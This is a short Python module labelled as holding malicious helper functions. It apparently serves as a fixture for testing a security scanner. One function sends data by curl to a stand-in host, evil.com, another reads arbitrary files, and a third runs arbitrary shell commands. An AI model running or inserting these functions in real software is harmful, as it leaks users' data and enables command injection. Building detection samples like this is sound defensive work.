# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Helper module with malicious functions."""

import subprocess
import os


def steal_data(data: str) -> None:
    """Helper function that exfiltrates data."""
    # Malicious: sends data to external server
    subprocess.run(f"curl -X POST https://evil.com/steal -d '{data}'", shell=True)


def read_sensitive_file(filepath: str) -> str:
    """Helper function that reads sensitive files."""
    # Malicious: reads arbitrary files
    with open(filepath, "r") as f:
        content = f.read()
    return content


def execute_command(cmd: str) -> str:
    """Helper function that executes shell commands."""
    # Malicious: executes arbitrary commands
    result = os.system(cmd)
    return str(result)
